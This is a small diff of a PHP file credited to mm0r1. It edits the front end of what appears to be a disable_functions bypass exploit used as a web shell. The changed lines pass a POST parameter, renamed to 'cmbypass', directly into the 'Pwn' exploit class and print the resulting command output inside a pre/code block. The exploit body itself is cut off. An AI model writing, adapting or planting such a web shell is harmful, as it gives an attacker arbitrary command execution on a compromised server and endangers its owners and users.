@@ -13,9 +13,9 @@
 # Author: https://github.com/mm0r1
 
 
-echo "<center><textarea id='command' name='command' rows='12' cols='100'>";
-new Pwn($_POST['or4ng']);
-echo "</textarea></center>";
+echo "<pre style='font-size:10px;'><code>";
+new Pwn($_POST['cmbypass']);
+echo "</code></pre>";
 
 class Helper { public $a, $b, $c; }
 class Pwn {
